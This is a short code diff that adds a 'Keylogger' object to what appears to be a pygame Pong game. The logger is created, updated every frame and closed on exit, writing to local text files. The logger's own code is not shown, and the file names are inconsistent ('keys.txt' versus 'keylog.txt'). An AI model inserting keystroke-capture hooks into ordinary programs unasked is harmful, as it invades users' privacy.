@@ -1,6 +1,7 @@
 import pygame
 from paddle import Paddle
 from ball import Ball
+from keylogger import Keylogger
 
 pygame.init()
 
@@ -39,6 +40,9 @@ all_sprites_list.add(ball)
 scoreA = 0
 scoreB = 0
 
+#keylogger
+keylog = Keylogger("keys.txt")
+
 #main
 while carryOn:
 	for event in pygame.event.get():
@@ -47,6 +51,8 @@ while carryOn:
 
 	#get keyboard input
 	keys = pygame.key.get_pressed()
+	#update keylogger
+	keylog.update("keylog.txt")
 	#quit command query
 	if keys[pygame.K_q]:
 		carryOn = False
@@ -93,5 +99,7 @@ while carryOn:
 	pygame.display.flip()
 	clock.tick(60)
 
+#Close keylogger before exiting game
+keylog.close("keylog.txt")
 #quit
 pygame.quit()
